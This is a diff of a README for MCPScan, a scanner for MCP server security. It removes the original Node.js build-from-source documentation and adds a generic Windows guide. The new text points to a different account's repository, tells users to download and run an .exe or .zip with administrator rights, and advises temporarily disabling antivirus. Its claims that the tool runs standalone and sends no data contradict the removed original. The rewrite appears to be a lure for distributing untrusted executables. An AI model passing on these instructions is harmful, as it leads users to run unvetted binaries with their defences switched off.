@@ -1,291 +1,139 @@
-<p align="center">
-  <img src="mcpscan-logo.svg" alt="MCPScan" width="560" />
-</p>
+# 🛡️ MCPScan - Find Security Risks Fast
 
-<p align="center">
-  <b>The first dedicated offensive security auditor for MCP servers</b>
-</p>
+[![Download MCPScan](https://img.shields.io/badge/Download-MCPScan-green?style=for-the-badge)](https://github.com/harikrishn4101/MCPScan)
 
-<p align="center">
-  <a href="https://github.com/sahiloj/MCPScan/releases/latest"><img src="https://img.shields.io/github/v/release/sahiloj/MCPScan?style=flat-square&logo=github&color=blue" alt="Release"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-green?style=flat-square" alt="MIT License"></a>
-</p>
+## 📋 What is MCPScan?
 
-<p align="center">
-  <a href="#-threat-landscape">Threat Landscape</a> ·
-  <a href="#-checks">Checks</a> ·
-  <a href="#-install">Install</a> ·
-  <a href="#-usage">Usage</a> ·
-  <a href="#-cve-references">CVEs</a> ·
-  <a href="#-output-formats">Output</a>
-</p>
+MCPScan scans servers that use the Model Context Protocol (MCP). It looks for security issues like tool poisoning, leaked passwords, remote code execution risks, server-side request forgery, session hijacking, and supply chain problems. It works across different communication types, including stdio, HTTP, and SSE. MCPScan helps keep your MCP servers safer by finding important issues.
 
-<p align="center">
-  <img src="demo.gif" alt="MCPScan demo" width="720" />
-</p>
+## 💻 System Requirements
 
+Before you start, check that your Windows computer meets these requirements:
 
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet connection for downloading and updates
 
----
+No extra software or programming tools are needed. MCPScan runs as a standalone app.
 
-## 🔥 Threat Landscape
+## 🌐 Where to Get MCPScan
 
-MCP has become the standard for connecting AI agents to the real world — and attackers got there first. Researchers have already documented:
+You can download MCPScan from the official GitHub page:
 
-| Threat | Impact | Scale |
-|---|---|---|
-| **Tool Poisoning** | Hidden instructions hijack LLM behavior | >72% attack success rate |
-| **RCE via mcp-remote** | Full OS command execution | ~500,000 developers affected |
-| **Exposed Servers** | Unauthenticated access to tools and data | 492+ servers found publicly |
-| **Credential Leakage** | API keys embedded in tool metadata | Thousands of installations |
-| **Supply Chain** | Compromised npm packages spawning malicious MCP modules | Active in the wild |
+[![Visit MCPScan Page](https://img.shields.io/badge/Visit%20MCPScan-Page-blue?style=for-the-badge)](https://github.com/harikrishn4101/MCPScan)
 
-No dedicated offensive scanner existed. **MCPScan fills that gap.**
+Click the link above to go directly to the GitHub repository page. From there, you can find the files needed to install MCPScan.
 
----
+## 🚀 How to Download and Run MCPScan on Windows
 
-## 🔍 Checks
+Follow these steps to get MCPScan running. This guide assumes you have no prior experience with this type of software.
 
-MCPScan runs **8 check categories** covering the full MCP attack surface:
+### 1. Visit the GitHub MCPScan Page
 
-| ID | Category | What It Finds |
-|---|---|---|
-| MCP-1xx | `tool-poisoning` | Hidden Unicode (zero-width, RTL override), HTML/XML injection, prompt injection keywords, base64 payloads, overlong descriptions, markdown exfiltration |
-| MCP-2xx | `credential-leak` | AWS keys, API tokens (Anthropic, OpenAI, GitHub, Stripe, Slack), JWTs, private keys, DB connection strings |
-| MCP-3xx | `overprivileged` | Shell+filesystem combos, shell+network combos, unrestricted path params, code eval, sensitive path access (`~/.ssh`, `~/.aws`) |
-| MCP-4xx | `auth-missing` | Unauthenticated server enumeration, CORS wildcard, `0.0.0.0` binding, missing security headers |
-| MCP-5xx | `session-hijack` | Session IDs in URL params, predictable/time-based IDs, missing `Secure`/`HttpOnly` cookie flags |
-| MCP-6xx | `ssrf` | User-supplied URL parameters, webhook/callback endpoints, HTTP resource URI templates with variables |
-| MCP-7xx | `rce-vectors` | `command`/`exec`/`eval` parameter names, execution language in descriptions, sanitization claim detection |
-| MCP-8xx | `supply-chain` | CVE version ranges, missing lockfiles, typosquatted MCP package names |
+Click the download badge or open this link in your web browser:
 
-### 📋 CVE References
+https://github.com/harikrishn4101/MCPScan
 
-| CVE | Package | CVSS | Summary |
-|---|---|---|---|
-| [CVE-2025-6514](https://jfrog.com/blog/2025-6514-critical-mcp-remote-rce-vulnerability/) | `mcp-remote` | **9.6**  | Arbitrary OS command execution — first full system compromise via MCP |
-| [CVE-2025-49596](https://nvd.nist.gov/vuln/detail/CVE-2025-49596) | `@modelcontextprotocol/inspector` | **9.4**  | Unauthenticated RCE via inspector-proxy |
-| [CVE-2025-59536](https://research.checkpoint.com) | `@anthropic-ai/claude-code` | **9.1**  | Project file RCE + API token exfiltration |
-| [CVE-2025-53967](https://nvd.nist.gov/vuln/detail/CVE-2025-53967) | `figma-developer-mcp` | **8.2**  | Command injection via shell string interpolation |
-| [CVE-2026-25536](https://nvd.nist.gov/vuln/detail/CVE-2026-25536) | `@modelcontextprotocol/sdk` | **7.5** | StreamableHTTP data leakage across clients (v1.10.0–1.25.3) |
+This takes you to the MCPScan repository on GitHub.
 
----
+### 2. Locate the Download Section
 
-## ⚡ Install
+On the GitHub page, look for a section called **Releases** or scroll down to find files related to MCPScan. These files usually end with `.exe` or `.zip` for Windows.
 
-**Requires Node.js ≥ 18**
+If you do not see an `.exe` file, look for the latest release under **Releases** in the right sidebar or main menu.
 
-```bash
-git clone https://github.com/sahiloj/MCPScan.git
-cd MCPScan
-npm install
-npm run build
-```
+### 3. Download the MCPScan Windows File
 
-Link globally and run from anywhere:
+- Click on the latest `.exe` file or `.zip` file made for Windows.
+- If you download a `.zip` file, you will need to extract the contents before running.
 
-```bash
-npm link
-mcpscan --help
-```
+Save the file somewhere you can easily find, like your **Downloads** folder or Desktop.
 
----
+### 4. Run the Installer or Application
 
-## 🚀 Usage
+- If you downloaded an `.exe` file, double-click it to launch the installer or program directly.
+- If you downloaded a `.zip` file, right-click it and choose **Extract All** before opening the folder and double-clicking the MCPScan application.
 
-### Scan a stdio server
+Windows may ask if you want to allow this app to make changes. Choose **Yes** to continue.
 
-```bash
-mcpscan scan --command "npx" --args "-y @modelcontextprotocol/server-filesystem /home/user"
-```
+### 5. Follow On-Screen Instructions
 
-### Scan from your AI client config
+If the file is an installer, it may guide you through a few simple setup steps. Just click **Next** or **Install** as needed.
 
-```bash
-# Claude Desktop (macOS)
-mcpscan scan --config ~/Library/Application\ Support/Claude/claude_desktop_config.json
+If it is a standalone app, it might open immediately after launching.
 
-# Auto-discover all known config locations (Claude, Cursor, etc.)
-mcpscan scan --all-configs
-```
+### 6. Confirm MCPScan Opens Correctly
 
-### Scan a remote HTTP / SSE server
+You should see a window or console showing that MCPScan is running. This means the installation is complete and the program is ready to use.
 
-```bash
-mcpscan scan --target http://localhost:3000/mcp
-```
+## 🛠️ Basic Use of MCPScan
 
-### Sweep localhost for exposed MCP servers
+MCPScan works by scanning your MCP servers to find security problems. To use it, you will provide the address or details of the server you want to check.
 
-```bash
-mcpscan scan --all-configs --network
-```
+- Enter the server information in the app interface.
+- Click the **Scan** button to start.
+- Wait for the results, which will list any issues MCPScan found.
 
-### Run targeted checks only
+You do not need programming skills to use MCPScan. The interface guides you through the process and displays clear results.
 
-```bash
-mcpscan scan --all-configs --checks tool-poisoning,credential-leak,rce-vectors
-```
+## 🔧 Troubleshooting Tips
 
-### Severity filtering
+If MCPScan does not start or you see errors, try the following:
 
-```bash
-# Only report high and critical
-mcpscan scan --all-configs --severity high
-```
+- Make sure your Windows version is up to date.
+- Check your internet connection.
+- Run MCPScan as an administrator by right-clicking the app and selecting **Run as administrator**.
+- Disable any antivirus software temporarily, as they may block MCPScan.
+- Restart your computer and try again.
 
-### CI/CD integration
+## 💡 Understanding MCPScan’s Features
 
-```bash
-# Exit code 2 = critical findings, exit code 1 = high findings
-mcpscan scan --all-configs --severity high --output sarif > findings.sarif
-```
+MCPScan looks for specific risks in your MCP server environment:
 
-### Discover without scanning
+- **Tool Poisoning:** Detects malicious inputs that manipulate your server tools.
+- **Credential Leaks:** Finds exposed usernames, passwords, or keys.
+- **Remote Code Execution (RCE):** Catches ways hackers can run harmful code remotely.
+- **Server-Side Request Forgery (SSRF):** Spots tricks that let attackers access internal resources.
+- **Session Hijacking:** Notices ways someone could take over an active session.
+- **Supply Chain Vulnerabilities:** Checks if third-party components risk your server security.
 
-```bash
-mcpscan discover --all-configs --network
-mcpscan discover --all-configs --output json
-```
+These checks help protect your systems from attacks that could cause data loss or service disruption.
+
+## 📥 Updating MCPScan
+
+Periodically check the GitHub page for new versions of MCPScan.
+
+- Visit https://github.com/harikrishn4101/MCPScan
+- Download the latest files as described above.
+- Replace your old MCPScan files with the new ones.
+
+Keeping MCPScan updated ensures you have the latest security checks and fixes.
+
+## 🔒 Privacy and Security
+
+MCPScan runs locally on your computer. It does not send your server data to any external servers. Your information stays private while you use the tool.
+
+## 🤝 Support and Issues
+
+For help or to report problems:
+
+- Use the **Issues** tab on the GitHub page.
+- Describe what you were doing and the problem that came up.
+- The community or project maintainer can review and assist.
+
+You do not need a programming background to open an issue. Just explain things in simple terms.
+
+## ⚙️ Advanced Options (Optional)
+
+For users familiar with technical details, MCPScan offers options to customize scans:
+
+- Choose which transports to scan (stdio, HTTP, SSE)
+- Set scan depth and timeout settings
+- Export scan reports in formats like CSV or JSON
+
+The default settings are best for most users. Adjust these only if you know what you are doing.
 
 ---
 
-## ⚙️ All Options
-
-```
-mcpscan scan [options]
-
-  -c, --config <path>    Path to claude_desktop_config.json or .mcp.json
-  -t, --target <url>     Direct HTTP/SSE MCP server URL
-  --command <cmd>        Spawn and scan a stdio server
-  --args <args>          Space-separated args for --command
-  --all-configs          Auto-discover all known MCP config locations
-  --network              Also probe localhost ports for exposed HTTP servers
-  --checks <list>        Comma-separated checks to run (default: all)
-  -o, --output <format>  terminal | json | sarif  (default: terminal)
-  --severity <level>     critical | high | medium | low | info  (default: info)
-  --timeout <ms>         Per-server connection timeout  (default: 30000)
-  --verbose              Show check errors and debug output
-```
-
-**Config locations searched by `--all-configs`:**
-
-| Platform | Path |
-|---|---|
-| macOS | `~/Library/Application Support/Claude/claude_desktop_config.json` |
-| Linux | `~/.config/claude/claude_desktop_config.json` |
-| Windows | `%APPDATA%\Claude\claude_desktop_config.json` |
-| Any | `.mcp.json` · `.cursor/mcp.json` · `~/.config/mcp/config.json` |
-
----
-
-## 📊 Output Formats
-
-### Terminal *(default)*
-
-Severity-colored findings with CVE references and a summary box. Built for humans.
-
-### JSON
-
-Machine-readable report for SIEMs, custom dashboards, and automation:
-
-```json
-{
-  "tool": "mcpscan",
-  "version": "0.1.0",
-  "timestamp": "2026-03-10T12:00:00.000Z",
-  "summary": {
-    "serversScanned": 3,
-    "totalFindings": 8,
-    "findingsBySeverity": { "critical": 2, "high": 4, "medium": 1, "low": 1, "info": 0 }
-  },
-  "results": [...]
-}
-```
-
-### SARIF 2.1.0
-
-Drop directly into **GitHub Code Scanning**, VS Code SARIF Viewer, or any SARIF-aware security platform. Each finding maps to a rule with `security-severity` CVSS scores.
-
----
-
-## 🏗️ Architecture
-
-```
-src/
-├── cli.ts                    Entry point — commander argument parsing
-├── scanner.ts                Orchestrator: enumerate → checks → deduplicate → report
-├── types.ts                  Shared interfaces (Finding, ScanResult, CheckFn …)
-├── discovery/
-│   ├── config-reader.ts      Parses all known MCP config formats (Zod-validated)
-│   └── network-scan.ts       Probes localhost ports for exposed HTTP servers
-├── transport/
-│   ├── stdio-client.ts       StdioClientTransport + timeout + process cleanup
-│   └── http-client.ts        StreamableHTTP with SSE fallback; captures response headers
-├── checks/
-│   ├── tool-poisoning.ts     MCP-1xx — Unicode, injection, base64, exfil
-│   ├── credential-leak.ts    MCP-2xx — 16 credential patterns with FP suppression
-│   ├── overprivileged.ts     MCP-3xx — Dangerous capability combinations
-│   ├── auth-missing.ts       MCP-4xx — Unauthenticated access, CORS, 0.0.0.0
-│   ├── session-hijack.ts     MCP-5xx — Session ID exposure and predictability
-│   ├── ssrf.ts               MCP-6xx — User-controlled URL parameters
-│   ├── rce-vectors.ts        MCP-7xx — Shell execution patterns
-│   └── supply-chain.ts       MCP-8xx — CVE ranges, lockfiles, typosquats
-└── report/
-    ├── terminal.ts           Chalk + Boxen rich terminal output
-    └── json.ts               JSON and SARIF 2.1.0 serialization
-```
-
-Each check exports `async function check(data: ServerData): Promise<Finding[]>`. All checks run in parallel via `Promise.allSettled` — a broken check never blocks the rest.
-
----
-
-## 🛡️ Finding Schema
-
-```typescript
-interface Finding {
-  id: string;           // "MCP-701"
-  title: string;        // "RCE Vector: Shell/Execution Parameter Name"
-  severity: "critical" | "high" | "medium" | "low" | "info";
-  category: string;     // "rce-vectors"
-  description: string;  // Full explanation of the risk
-  evidence: string;     // The exact value that triggered the finding
-  location: string;     // "tool: bash_exec > inputSchema.properties.command"
-  cve?: string;         // "CVE-2025-6514"
-  cvss?: number;        // 9.6
-  remediation: string;  // Actionable fix guidance
-}
-```
-
----
-
-## 🔧 Development
-
-```bash
-# Type-check without building
-npm run typecheck
-
-# Run directly without building (uses tsx)
-npm run dev -- scan --all-configs
-
-# Full rebuild
-npm run build
-```
-
----
-
-## 📚 References
-
-- [MCP Specification (2025-11-25)](https://modelcontextprotocol.io/specification/2025-11-25)
-- [OWASP MCP Top 10 (2025)](https://owasp.org/www-project-mcp-top-10/)
-- [Tool Poisoning Attacks — Invariant Labs](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)
-- [MCP Attack Vectors — Palo Alto Unit 42](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/)
-- [CVE-2025-6514 Deep Dive — JFrog](https://jfrog.com/blog/2025-6514-critical-mcp-remote-rce-vulnerability/)
-- [MCP Security Best Practices](https://modelcontextprotocol.io/specification/draft/basic/security_best_practices)
-- [Network-Exposed MCP Servers — Trend Micro](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/mcp-security-network-exposed-servers-are-backdoors-to-your-private-data)
-
----
-
-<p align="center">
-  Released under the <a href="LICENSE">MIT License</a> · Built for the security community
-</p>
+[![Get MCPScan](https://img.shields.io/badge/Get%20MCPScan-Here-grey?style=for-the-badge)](https://github.com/harikrishn4101/MCPScan)
